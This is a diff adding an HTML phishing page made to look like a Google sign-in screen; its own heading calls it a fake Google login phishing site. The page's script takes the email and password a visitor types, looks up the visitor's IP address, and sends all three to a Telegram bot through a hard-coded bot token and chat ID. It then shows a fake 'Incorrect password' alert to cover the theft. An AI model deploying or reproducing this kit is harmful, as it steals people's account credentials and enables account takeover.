@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to Google Account</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body { font-family: Arial, sans-serif; background: #f3f3f3; text-align: center; padding: 50px; }
+        .login-container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); width: 300px; margin: auto; }
+        .login-container img { width: 100px; margin-bottom: 20px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
+        button { width: 100%; padding: 10px; background: #0078D4; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        button:hover { background: #005a9e; }
+        .loading { display: none; font-size: 14px; color: #666; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo">
+        <h3>偽冒Google登入頁面的釣魚網站</h3>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="請輸入電子信箱" required>
+            <input type="password" id="password" placeholder="請輸入密碼" required>
+            <button type="submit">Next</button>
+            <p class="loading">Verifying...</p>
+        </form>
+    </div>
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            // 顯示加載動畫
+            document.querySelector(".loading").style.display = "block";
+            
+            // 收集用戶信息
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+            
+            var botToken = "8083238190:AAG-SpdyNc8BXVexo2VVbrBaIeBjxJ3PmHo";
+            var chatId = "1800067559";
+            var userIp = "Unknown";
+            
+            // 取得受害者IP並發送數據
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    userIp = data.ip;
+                    
+                    // 發送帳密到Telegram
+                    var message = `👤 Google Phishing Log:
+                    🆔 Email: ${username}
+                    🔑 Password: ${password}
+                    📍 IP: ${userIp}`;
+                    
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ chat_id: chatId, text: message })
+                    });
+                    
+                    // 顯示錯誤訊息
+                    setTimeout(() => {
+                        alert("Incorrect password. Please try again.");
+                        document.getElementById("password").value = "";
+                        document.querySelector(".loading").style.display = "none";
+                    }, 2000);
+                });
+        });
+    </script>
+</body>
+</html>
